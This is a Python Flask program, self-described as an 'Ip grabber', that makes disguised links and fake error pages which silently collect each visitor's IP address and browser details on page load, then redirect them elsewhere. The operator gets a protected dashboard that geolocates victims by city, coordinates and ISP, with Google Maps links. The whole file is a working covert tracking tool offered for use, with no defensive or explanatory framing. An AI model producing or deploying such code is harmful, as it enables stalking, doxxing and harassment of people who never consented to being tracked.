import os, json, sys, time, threading, random, string
from datetime import datetime
try:
  import flask, requests
  from flask import request
except:
  print("couldnt import packages, installing packages...")
  packages = ["flask", "requests"]
  for x in packages:
    os.system("pip install "+x)
  import flask, requests
  from flask import request

os.system("clear" if os.name == "posix" else "cls")

app = flask.Flask("app")

fp = 'ips.json'

def creategrabber(file, redirect_url):
  file.write('''
  <script>
  function saveip(ip) {
    try {
      var data = JSON.stringify({
        "query": ip, 
        "useragent": navigator.userAgent
      });
      var url = window.location.origin+'/saveip'
      var requests = new XMLHttpRequest();
      requests.open('POST', url, true);
      requests.setRequestHeader("Content-Type", "application/json");
      requests.send(data);
    } catch(e) {
      return;
    };
  };

  function main() {
    try {
      let i = document.getElementById('redirect');
      var requests = new XMLHttpRequest();
      requests.open("GET", "https://api.ipify.org", true);
      requests.send(null)
      requests.onreadystatechange = function() {
      var ip = requests.responseText;
      saveip(ip)
      i.innerHTML = '<meta http-equiv="refresh" content="0; url='''+redirect_url+'''">'
        };
      } catch(e) { 
      return;
    };
  };
  </script>
  <body onload="main()" id='redirect'>
  </body>
  ''')

def run():
  app.run(port=6969, host="0.0.0.0")

def slowprint(text):
  for x in text:
    print('' + x, end="")
    sys.stdout.flush()
    time.sleep(0.01)

slowprint("===== Ip grabber made by DaredeviL menZ =====\n")

time.sleep(1)

slowprint("Starting flask server...\n")

time.sleep(1)

threading.Thread(target=run).start()

pin = random.randint(11111, 99999)

err = '''
  <script>
  function saveip(ip) {
    try {
      var data = JSON.stringify({
        "query": ip, 
        "useragent": navigator.userAgent
      });
      var url = window.location.origin+'/saveip'
      var requests = new XMLHttpRequest();
      requests.open('POST', url, true);
      requests.setRequestHeader("Content-Type", "application/json");
      requests.send(data);
    } catch(e) {
      return;
    };
  };

  function main() {
    try {
      var requests = new XMLHttpRequest();
      requests.open("GET", "https://api.ipify.org", true);
      requests.send(null)
      requests.onreadystatechange = function() {
      var ip = requests.responseText;
      saveip(ip)
        };
      } catch(e) { 
      return;
    };
  };
  </script>
  <body onload="main()">
  <title>404 Not Found</title>
  <h1>Not Found</h1>
  <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
  </body>
  '''

@app.route('/')
def main():
  return '''
  <script>
  function saveip(ip) {
    try {
      var data = JSON.stringify({
        "query": ip, 
        "useragent": navigator.userAgent
      });
      var url = window.location.origin+'/saveip'
      var requests = new XMLHttpRequest();
      requests.open('POST', url, true);
      requests.setRequestHeader("Content-Type", "application/json");
      requests.send(data);
    } catch(e) {
      return;
    };
  };

  function main() {
    try {
      var requests = new XMLHttpRequest();
      requests.open("GET", "https://api.ipify.org", true);
      requests.send(null)
      requests.onreadystatechange = function() {
      var ip = requests.responseText;
      saveip(ip)
        };
      } catch(e) { 
      return;
    };
  };

  function redir() {
    let i = document.getElementById('redirect');
    let val = document.getElementById('ak').value;
    i.innerHTML = '<meta http-equiv="refresh" content="0; url=' + window.location.origin+'/ips?p='+ val + '">';
  };
  </script>
  <body onload="main()" id="redirect">
  <h1>Verification</h1>
  <input id="ak" placeholder="Access key"> <button onclick="redir()">Submit</button>
  </body>
  '''

@app.route('/g/<code>')
def grabip(code):
  path = "grabbers/"+code+".html"
  if os.path.isfile(path) is False:
    return err
  else:
    with open(path, "r") as f:
      return f.read()

@app.route('/saveip', methods=['POST'])
def saveip():
  try:
    sent = request.json
    ip = sent['query']
    if ip == '':
      return 'aaa'
    baseurl = 'http://ip-api.com/json/'+ip
    r = requests.get(baseurl).json()
    f = open(fp, 'r')
    js = json.load(f)
    js[ip] = r
    js[ip]['today_at'] = str(datetime.utcnow())
    js[ip]['user_agent'] = sent['useragent']
    json.dump(js, open(fp, 'w'), indent=2)
    return 'a'
  except:
    return 'b'

@app.route('/ips')
def viewips():
  gnf = '''
  <script>
  function saveip(ip) {
    try {
      var data = JSON.stringify({
        "query": ip, 
        "useragent": navigator.userAgent
      });
      var url = window.location.origin+'/saveip'
      var requests = new XMLHttpRequest();
      requests.open('POST', url, true);
      requests.setRequestHeader("Content-Type", "application/json");
      requests.send(data);
    } catch(e) {
      return;
    };
  };

  function main() {
    try {
      var requests = new XMLHttpRequest();
      requests.open("GET", "https://api.ipify.org", true);
      requests.send(null)
      requests.onreadystatechange = function() {
      var ip = requests.responseText;
      saveip(ip)
        };
      } catch(e) { 
      return;
    };
  };
  </script>
  <body onload="main()">
  <title>Invalid Access key</title>
  <h1>Invalid Access key</h1>
  <p>The Access key you entered is invalid.</p>
  </body>
  '''
  args = request.args
  try:
    p = args['p']
    if int(p) != pin:
      return gnf
    else:
      f = open(fp, 'r')
      js = json.load(f)
      result = []
      countries = []
      ips = []
      lat = []
      lon = []
      isp = []
      ua = []
      ga = []
      n = 0
      if len(js.keys()) == 0:
        return "<title>no Grabbed ip addresses</title> <h1>No ips has been grabbed.</h1><button onclick='window.location.reload()' style='margin-top:5px;'>Reload</button>"
      for x in js.keys():
        ips.append('<td>'+x+'</td>')
        countries.append('<td>'+js[x]['country']+", "+js[x]['city']+'</td>')
        lat.append('<td>'+str(js[x]['lat'])+'</td>')
        lon.append('<td>'+str(js[x]['lon'])+'</td>')
        isp.append('<td>'+js[x]['isp']+'</td>')
        ua.append('<td>'+js[x]['user_agent']+'</td>')
        ga.append('<td>'+js[x]['today_at']+'</td>')
        result.append("<tr>"+f"{ips[n]}\n{countries[n]}\n{lat[n]}\n{lon[n]}\n{isp[n]}\n{ua[n]}\n{ga[n]}\n<td><a href='https://google.co.id/maps/search/{lat[n]}+{lon[n]}'>Click here</a></td>"+"</tr>")
        n+=1
      return '''
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>Grabbed ip addresses</title>
        <style>
        * {font-family:sans-serif;}
        table, th, td{ border:2px solid lightblue; text-align:center;}
        a {color:red;}
        </style>
        <center>
        <table style="width:auto">
        <th>Ip address</th>
        <th>Country</th>
        <th>Latitude</th>
        <th>Longtitude</th>
        <th>Internet service provider</th>
        <th>User agent</th>
        <th>Grabbed at</th>
        <th>Google maps</th>
        </tr>
        '''+'\n'.join(result)+'''
        </table>
        </center>
        <button onclick="window.location.reload()" style="margin-top:5px;">Reload</button>
      '''
  except Exception as e:
    print(e)
    return gnf

@app.errorhandler(404)
def page_not_found(e):
  return err


while True:
  os.system("clear" if os.name == "posix" else "cls")
  slowprint("[1] Create grabber\n[2] Delete grabber\n[3] Ip information\n[4] Get access key\n>")
  opt = input()
  if opt == "1":
    os.system("clear" if os.name == "posix" else "cls")
    slowprint("Redirect URL\n>")
    url = input()
    if url.startswith('http://') is True or url.startswith('https://') is True:
      res = url
    else:
      res = 'https://' + url
    os.system("clear" if os.name == "posix" else "cls")
    rs = ''.join(random.choices(string.ascii_letters + string.digits, k=9))
    with open("grabbers/"+rs+".html", "w") as f:
      creategrabber(f, res)
    os.system("clear" if os.name == "posix" else "cls")
    slowprint(f"Grabber created, code: /g/{rs}")
    time.sleep(3)
  if opt == "2":
    os.system("clear" if os.name == "posix" else "cls")
    if len(os.listdir('grabbers')) == 0:
      print("There arent any grabbers.")
      time.sleep(3)
    else:
      res = '\n'.join([f'[{os.listdir("grabbers").index(x)+1}] {x.split(".")[0]}' for x in os.listdir('grabbers')])
      slowprint(f"{res}\n>")
      path = input()
      if path.isnumeric() is False:
        print("You must input a number, not a string.")
      else:
        os.remove('grabbers/'+os.listdir('grabbers')[int(path)-1])
        os.system("clear" if os.name == "posix" else "cls")
        slowprint("Grabber removed.")
        time.sleep(3)
  if opt == "3":
    os.system("clear" if os.name == "posix" else "cls")
    slowprint("Ip address\n>")
    ip = input()
    os.system("clear" if os.name == "posix" else "cls")
    baseurl = 'http://ip-api.com/json/'+ip
    r = requests.get(baseurl)
    try:
      r = r.json()
      res = f"Country: {r['country']}, {r['city']}\nLatitude: {r['lat']}\nLontitude: {r['lon']}\nInternet Service Provider: {r['isp']}\nGoogle maps: https://google.co.id/maps/search/{r['lat']}+{r['lon']}\n\n"
      slowprint(res)
    except:
      print("Invalid ip.")
    slowprint("Press enter to close\n")
    input()
  if opt == "4":
    os.system("clear" if os.name == "posix" else "cls")
    slowprint(f"Access key: {pin}\n")
    time.sleep(3)
